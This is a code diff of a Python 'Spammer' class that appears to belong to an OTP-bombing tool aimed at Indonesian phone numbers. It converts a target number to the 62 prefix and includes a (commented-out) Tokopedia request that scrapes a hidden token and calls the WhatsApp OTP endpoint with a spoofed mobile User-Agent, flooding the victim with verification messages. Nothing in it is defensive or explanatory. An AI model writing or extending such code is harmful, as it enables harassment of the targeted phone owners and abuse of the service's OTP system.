@@ -1,5 +1,6 @@
-from utils.io import question, confirm
-import requests, json
+from lib.Config import Config
+from utils.io import confirm, log
+import requests, json, random
 
 class Spammer (Config):
     def __init__ (self, target):
@@ -9,14 +10,18 @@ class Spammer (Config):
     def start (self):
         if confirm("start spammer ?"):
             if self.process():
-                log("success", f"success sent spam to '{ self.tsrget }' !")
+                log("success", f"success sent spam to '{ self.target }' !")
             else:
-                log("warning", f"failed sent spam to '{ self.tsrget }' !")
+                log("warning", f"failed sent spam to '{ self.target }' !")
                 if confirm("do you want to spam again ?"):
                     self.process()
         log("info", "oke, good bye !")
         exit()
+        
     def process (self):
+        nomor = self.target
+        b     = nomor[1:12] # Contoh: nomor = 89508226367
+        c     = "62" + b    # Contoh: nomor = 6289508226367
         try:
             pass
             # Tokopedia                             =  requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}, data = {"otp_type" : "116","msisdn" : nomor,"tk" : re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'User-Agent' : "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}).text).group(1),"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}).text
